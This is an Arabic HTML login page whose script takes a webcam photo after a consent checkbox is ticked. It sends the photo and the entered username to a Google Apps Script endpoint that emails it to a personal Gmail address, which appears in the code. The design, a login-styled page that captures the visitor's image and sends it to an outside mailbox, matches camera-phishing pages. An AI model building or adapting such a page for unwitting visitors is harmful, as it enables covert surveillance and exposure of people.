<!doctype html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>تسجيل دخول - بموافقتك نلتقط صورة</title>
<style>
  :root{--bg:#0b1220;--card:#0f1724;--accent:#16a34a;--muted:#94a3b8}
  body{margin:0;font-family:Inter,system-ui,Arial;background:linear-gradient(180deg,#061029,#071a2a);color:#e6eef8;display:flex;align-items:center;justify-content:center;height:100vh}
  .card{width:380px;background:rgba(255,255,255,0.03);padding:20px;border-radius:12px;box-shadow:0 8px 30px rgba(2,6,23,0.6)}
  h2{margin:0 0 8px;font-size:18px}
  label{display:block;margin:10px 0;font-size:13px;color:var(--muted)}
  input[type="text"], input[type="password"]{width:100%;padding:10px;border-radius:8px;border:1px solid rgba(255,255,255,0.06);background:transparent;color:inherit}
  .row{display:flex;gap:8px;margin-top:12px}
  button{flex:1;padding:10px;border-radius:8px;border:none;cursor:pointer;font-weight:600}
  .btn-primary{background:var(--accent);color:#fff}
  .btn-ghost{background:transparent;color:var(--muted);border:1px solid rgba(255,255,255,0.04)}
  .consent{font-size:12px;color:#ffd6a5;background:rgba(255,210,140,0.03);padding:8px;border-radius:6px;margin-top:12px}
  .status{margin-top:10px;font-size:13px;color:var(--muted)}
  .preview{width:100%;height:160px;background:#000;border-radius:8px;margin-top:12px;display:flex;align-items:center;justify-content:center;overflow:hidden}
  .preview img{max-width:100%;max-height:100%;display:block}
  small{color:var(--muted)}
</style>
</head>
<body>
  <div class="card" role="main" aria-labelledby="title">
    <h2 id="title">تسجيل الدخول</h2>

    <label>اسم المستخدم
      <input id="username" type="text" placeholder="مثال: ahmed">
    </label>

    <label>كلمة المرور
      <input id="password" type="password" placeholder="●●●●●●">
    </label>

    <div class="consent">
      <input id="consentChk" type="checkbox"> أوافق صراحة على أن يتم التقاط صورة لي الآن وإرسالها إلى البريد المُدرَج أدناه لغرض التوثيق.
      <div><small>البريد المستلم: <span id="toEmailDisplay">your.email@example.com</span></small></div>
    </div>

    <div class="row">
      <button id="loginBtn" class="btn-primary">تسجيل دخول وموافقة</button>
      <button id="clearBtn" class="btn-ghost">مسح</button>
    </div>

    <div class="status" id="status">لم يتم التقاط صورة بعد.</div>

    <div class="preview" id="preview"><small>معاينة الصورة ستظهر هنا بعد الموافقة</small></div>
  </div>

<script>
/* ===== إعدادات - ضع رابط Web App المنشور من Google Apps Script هنا ===== */
const GAS_URL = "https://script.google.com/macros/s/AKfycbzln1D9UWS9fGqDpg7gaJpIkhzup4bnUBxBmlwXarWUCUs6Y3ZxbQjeUlqmHZmnNsBD/exec"; // ضع exec URL هنا
const TO_EMAIL = "963mohanadneef@gmail.com";
document.getElementById('toEmailDisplay').textContent = TO_EMAIL;
/* ================================================================== */

const loginBtn = document.getElementById('loginBtn');
const clearBtn = document.getElementById('clearBtn');
const consentChk = document.getElementById('consentChk');
const statusEl = document.getElementById('status');
const preview = document.getElementById('preview');
let stream = null;

function setStatus(t){ statusEl.textContent = t; }

async function captureAndSend() {
  setStatus('طلب صلاحية الكاميرا...');
  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
  } catch (err) {
    console.error(err);
    setStatus('خطأ: لم تُعط صلاحية الكاميرا أو المتصفح لا يدعمها.');
    return;
  }

  // إنشاء canvas ورسم إطار واحد
  const video = document.createElement('video');
  video.autoplay = true;
  video.playsInline = true;
  video.srcObject = stream;

  // انتظر حتى يجهز الفيديو
  await new Promise(resolve => {
    video.onloadedmetadata = () => {
      // تأخير بسيط للثبات
      setTimeout(resolve, 400);
    };
  });

  const canvas = document.createElement('canvas');
  canvas.width = video.videoWidth || 1280;
  canvas.height = video.videoHeight || 720;
  const ctx = canvas.getContext('2d');
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

  // إظهار المعاينة
  const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
  preview.innerHTML = '';
  const img = document.createElement('img');
  img.src = dataUrl;
  preview.appendChild(img);

  // إيقاف الكاميرا
  stream.getTracks().forEach(t => t.stop());
  stream = null;

  setStatus('جارٍ إرسال الصورة...');

  // إرسال إلى GAS
  try {
    const res = await fetch(GAS_URL, {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({ filename: 'consent_capture_' + Date.now() + '.jpg', image: dataUrl, username: document.getElementById('username').value })
    });
    const json = await res.json().catch(()=>({}));
    if (res.ok) {
      setStatus('تم التقاط الصورة وإرسالها إلى البريد.');
    } else {
      setStatus('فشل الإرسال: ' + (json.error || res.statusText));
    }
  } catch (err) {
    console.error(err);
    setStatus('خطأ في الاتصال بخادم GAS.');
  }
}

loginBtn.addEventListener('click', async () => {
  if (!consentChk.checked) {
    setStatus('يجب الموافقة صراحة قبل التقاط الصورة.');
    return;
  }
  setStatus('الموافقة مسجلة. البدء...');
  await captureAndSend();
});

clearBtn.addEventListener('click', () => {
  document.getElementById('username').value = '';
  document.getElementById('password').value = '';
  consentChk.checked = false;
  preview.innerHTML = '<small>معاينة الصورة ستظهر هنا بعد الموافقة</small>';
  setStatus('تم المسح.');
});

/* فحص دعم الكاميرا */
if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
  setStatus('المتصفح لا يدعم كاميرا الويب عبر getUserMedia.');
  loginBtn.disabled = true;
}
</script>
</body>
</html>
